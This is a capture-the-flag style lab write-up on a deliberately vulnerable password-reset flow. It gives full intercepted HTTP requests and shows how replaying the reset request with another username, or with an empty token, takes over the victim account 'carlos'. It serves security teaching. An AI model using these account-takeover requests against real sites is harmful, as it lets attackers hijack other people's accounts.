# Lab 12: Password reset broken logic

## Description

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`

---

## Solution

Login with the credentials `wiener:peter` and intercept the login request in case it is useful later.

```http
POST /login HTTP/1.1
Host: acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net
Cookie: session=rb68XHfH2JNq7QCemuIc1hGa36PZB37D
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net
Dnt: 1
Referer: https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=wiener&password=peter
```

After successfully logging in, an account screen is rendered that displays the current user's email address along with the option to update the user account's email address.

![](images/Pasted%20image%2020210814161100.png)

Log back out and return to the login page. This time, choose the `Forgot Password?` option. A prompt to enter the username or email address is rendered.

![](images/Pasted%20image%2020210814161341.png)

Enter the username `wiener` and intercept the request.

```http
POST /forgot-password HTTP/1.1
Host: acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net
Cookie: session=4s7kUoHhSV1LEZ3qjjuIBsNHAoTzbS84
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net
Dnt: 1
Referer: https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=wiener
```

Navigate to `wiener`'s email client. An email has been generated with the following password reset link: `https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net/forgot-password?temp-forgot-password-token=iqjRxSMWGiXVQ8ghE0hBVciYVcUAasDq`. The token appears to be fairly random and not merely an encoded blob of user account data (i.e., `base64(username)`). Follow the link to be taken to a new form to change the password.

![](images/Pasted%20image%2020210814162049.png)

Submit the form with `peter` as the new password and intercept the request

```http
POST /forgot-password?temp-forgot-password-token=iqjRxSMWGiXVQ8ghE0hBVciYVcUAasDq HTTP/1.1
Host: acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net
Cookie: session=4s7kUoHhSV1LEZ3qjjuIBsNHAoTzbS84
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net
Dnt: 1
Referer: https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net/forgot-password?temp-forgot-password-token=iqjRxSMWGiXVQ8ghE0hBVciYVcUAasDq
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

temp-forgot-password-token=iqjRxSMWGiXVQ8ghE0hBVciYVcUAasDq&username=wiener&new-password-1=peter&new-password-2=peter
```

The token is embedded both as a query parameter and in the body of the request. A successful submission yields a 302 redirect to `/`.

Go for an easy win. Perhaps the `POST /forgot-password` endpoint doesn't actually check to make sure `temp-forgot-password-token` is associated with the `username` from the body. Attempt to replay this request but change `username` to `carlos`.

```http
POST /forgot-password?temp-forgot-password-token=iqjRxSMWGiXVQ8ghE0hBVciYVcUAasDq HTTP/1.1
Host: acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net
Cookie: session=4s7kUoHhSV1LEZ3qjjuIBsNHAoTzbS84
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net
Dnt: 1
Referer: https://acfb1f001fe39dd980fa7ca4008100b4.web-security-academy.net/forgot-password?temp-forgot-password-token=iqjRxSMWGiXVQ8ghE0hBVciYVcUAasDq
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

temp-forgot-password-token=iqjRxSMWGiXVQ8ghE0hBVciYVcUAasDq&username=carlos&new-password-1=peter&new-password-2=peter
```

The response is a 302 redirect to `/`, indicating a successful password change. Go back to the login screen and login with the credentials `carlos:peter` to complete the challenge.

---

## Understanding the Backend

What exactly is the backend doing wrong, though? It's either:

1. Ignoring `temp-forgot-password-token` altogether and simply changing the password of `username`.
2. Not ensuring there's an association between `temp-forgot-password-token` and `username` in the database.

To determine if it's #1, forward the request with username `carlos` and a new password. Remove `temp-forgot-password-token` from the query parameter, from the body, and from both, and see if any of these three requests actually changes the password.

Attempting the request with just `temp-forgot-password-token` in the body yields a successful password change. Attempting the request with just the token in the query parameter and not at all results in no password change. This indicates that the backend isn't completely ignoring the token, ruling out option #1.

To determine if it's #2, first determine if *any* token can be used with the username `carlos` by submitting requests with a modified token.

It looks like even any empty token yields a successful password change! This indicates that the backend server is simply checking the existence of the `temp-forgot-password-token` body parameter and isn't actually checking its value! As long as that parameter exists, it proceeds to change `username`'s password! Yikes!
